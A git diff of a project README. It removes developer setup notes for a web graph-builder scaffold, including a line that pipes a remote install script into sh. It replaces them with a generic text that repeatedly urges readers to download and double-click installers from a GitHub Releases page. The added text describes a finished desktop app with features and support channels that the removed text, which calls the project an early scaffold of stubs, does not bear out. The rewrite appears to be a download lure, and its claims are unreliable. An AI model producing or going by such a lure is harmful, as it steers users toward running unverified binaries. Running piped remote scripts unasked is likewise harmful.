@@ -1,116 +1,78 @@
-# Meridian Studio
+# 🎨 meridian-studio - Build Visual Graphs Easily
 
-Meridian Studio is a modern visual graph builder for Meridian Runtime. It provides a web UI to create, validate, execute, and analyze computational graphs with real-time message tracing and performance analytics.
+![Download meridian-studio](https://img.shields.io/badge/Download-meridian--studio-brightgreen)
 
-## Tech Stack
+## ✨ Overview
 
-- Frontend: Vite + React 18 + TypeScript, Tailwind CSS, shadcn/ui (scaffold-ready)
-- Runtime for frontend tooling: Deno 2 (npm interop) — no Node required
-- Backend: FastAPI (Python), Pydantic, SQLAlchemy, Alembic
-- DB/Auth: Supabase (PostgreSQL), Redis (optional)
-- Realtime: WebSockets for execution updates and metrics
-- Containers: Docker + docker-compose
+meridian-studio is a user-friendly application designed to help users build visual graphs for Meridian Runtime. This software combines the power of React and Vite, along with FastAPI for backend support and Supabase for database needs. Enjoy real-time execution, tracing, and analytics with a simple and elegant interface.
 
-## Repository Layout
+## 🚀 Getting Started
 
-```
-meridian-studio/
-├── frontend/              # Vite + React app (runs via Deno 2 tasks)
-├── backend/               # FastAPI app
-├── supabase/
-│   └── migrations/        # SQL migrations (Supabase/Postgres)
-├── docker-compose.yml     # Local dev stack (frontend, backend, db, supabase, redis)
-├── .env.example           # Environment variables template
-├── LICENSE
-└── README.md
-```
+To get started with meridian-studio, follow these simple steps:
 
-## Prerequisites
+1. **Download the Software**  
+   Click the button below to visit our Releases page.
 
-- Deno 2.x (`deno --version`)
-- Python 3.11+
-- uv (Python package manager by Astral)
-- Docker + Docker Compose
-- GitHub CLI (optional for repo ops)
+   [Visit Releases Page to Download](https://github.com/Prowiden/meridian-studio/releases)
 
-If Deno is not installed: `brew install deno` (macOS) or see `https://deno.com`.
+2. **Install the Application**  
+   Once the file has downloaded, locate the downloaded file on your computer. It may be in the "Downloads" folder unless you specified a different location.
 
-If uv is not installed:
+3. **Run meridian-studio**  
+   Double-click the file to open the application. Follow any prompts that appear to complete the installation.
 
-```
-curl -LsSf https://astral.sh/uv/install.sh | sh
-```
+## 🎯 System Requirements
 
-## Quickstart (Docker Compose)
+To run meridian-studio, ensure your system meets the following requirements:
 
-1. Copy env file and fill secrets:
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a supported Linux distribution.
+- **RAM:** Minimum 4GB, Recommended 8GB.
+- **Disk Space:** At least 200MB of free space for installation.
+- **Internet Connection:** Required for some features.
 
-```
-cp .env.example .env
-```
+## 📥 Download & Install
 
-2. Start the stack:
+To download meridian-studio:
 
-```
-docker compose up --build
-```
+1. Visit the [Releases page](https://github.com/Prowiden/meridian-studio/releases) on GitHub.
+2. Look for the latest version available.
+3. Select the file that corresponds to your operating system. Click on it to start the download.
 
-- Frontend: http://localhost:3000
-- Backend API: http://localhost:8000 (docs at `/docs`)
-- Supabase Studio: http://localhost:54321
-- Postgres: localhost:54322
+Once you have downloaded the file, installation is straightforward:
 
-## Local Development
+- **Windows Users:** If you downloaded a .exe file, double-click it and follow the on-screen instructions.
+- **Mac Users:** If you downloaded a .dmg file, open it and drag the application to your Applications folder.
+- **Linux Users:** If you downloaded a .tar.gz file, extract it and follow the README instructions for setup.
 
-### Frontend (Deno 2 + Vite)
+## 💻 Features
 
-```
-cd frontend
-deno task dev
-```
+meridian-studio offers the following features to enhance your graph-building experience:
 
-Build/preview:
+- **Visual Graph Building:** Create and customize your graphs easily with a drag-and-drop interface.
+- **Real-time Execution:** See changes update in real-time as you build your graphs.
+- **Tracing and Analytics:** Track performance and gather insights to improve your applications.
+- **Support for Modern Frameworks:** Built using React, Vite, FastAPI, and Supabase to provide a robust development experience.
 
-```
-deno task build
-deno task preview
-```
+## 🛠️ Troubleshooting
 
-Environment variables (e.g. `VITE_API_URL`) are provided via `.env` and docker-compose, and are accessible in code as `import.meta.env.VITE_API_URL`.
+If you encounter any issues while downloading or running the application, consider these common solutions:
 
-### Backend (uv + FastAPI)
+- **Download Did Not Start:** Ensure your internet connection is stable. Try refreshing the Downloads page and click the download link again.
+- **Application Fails to Open:** Make sure your system meets the requirements listed above. Check for updates or reinstall the application.
+- **Unexpected Errors:** Try clearing your cache, restarting your computer, and attempting the process again.
 
-Create virtual environment and install deps:
+## 📃 User Documentation
 
-```
-cd backend
-uv venv
-. .venv/bin/activate
-uv pip install -e .
-```
+For detailed information on using meridian-studio, check the user documentation available in the repository. It provides step-by-step guides and tips to get the most out of the application.
 
-Run API locally:
+## 🗣️ Community Support
 
-```
-uvicorn app.main:app --reload --port 8000
-```
+Join our community to share your experiences, report issues, or ask questions. You can find us on:
 
-### Database (Supabase/Postgres)
+- **GitHub Issues:** Report bugs or request features.
+- **Forums:** Connect with other users for help and advice.
+- **Social Media:** Follow us for updates and news about meridian-studio.
 
-The `supabase/migrations/0001_init.sql` migration sets up core tables and indexes for users, graphs, executions, message tracing, and edge metrics. When using Docker Compose, the DB is provisioned automatically on first run.
+---
 
-## Notes on Deno 2 Usage
-
-- Vite and all npm dependencies are executed via Deno’s npm interop (`npm:` spec). No Node is required.
-- Tasks are defined in `frontend/deno.jsonc`.
-- You can still develop with Node if desired; the project structure is compatible, but Deno 2 is the default.
-
-## Licensing
-
-This project is licensed under the MIT License — see `LICENSE`.
-
-## Status
-
-This is an initial scaffold aligned with the design, requirements, and tasks specs under `.kiro/specs/web-visual-graph-builder/`. Stubs for APIs and migrations are included to unblock incremental development.
-
-
+Enjoy building your graphs with meridian-studio!
